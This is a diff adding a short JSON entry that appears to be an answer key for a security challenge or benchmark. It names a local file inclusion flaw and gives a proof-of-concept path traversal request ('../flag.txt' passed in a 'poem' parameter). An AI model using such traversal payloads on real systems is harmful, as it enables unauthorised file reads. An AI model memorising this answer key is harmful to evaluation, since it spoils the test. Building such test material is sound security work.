@@ -1,0 +1,10 @@
+{
+  "expected_vulnerability": "LFI",
+  "severity": "High",
+  "oracle": "arbitrary_file_read",
+  "poc": {
+    "method": "GET",
+    "path": "/poems/?poem=../flag.txt",
+    "indicator": "path_traversal_via_get_parameter"
+  }
+}
